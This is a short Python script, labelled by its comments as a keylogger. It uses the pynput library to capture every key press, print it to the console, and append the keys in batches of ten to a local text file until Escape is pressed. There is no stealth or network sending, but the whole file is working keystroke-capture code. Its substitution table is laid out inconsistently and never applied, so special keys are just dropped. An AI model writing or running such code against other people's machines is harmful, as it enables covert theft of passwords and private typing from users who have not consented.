# imports for the keylogger app

# import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []
substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
                      'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
                      'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13',
                      '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd',
                      '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']


def on_press(key):
    global keys, count
    count += 1
    keys.append(key)

    print(f"{key} pressed")

# write to file after every 10 characters
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


# write the pressed keys to a file
def write_file(keys):
    with open("demo_file2.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k not in substitution:
                f.write(k)


# terminates the keylogger when escape key is pressed
def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

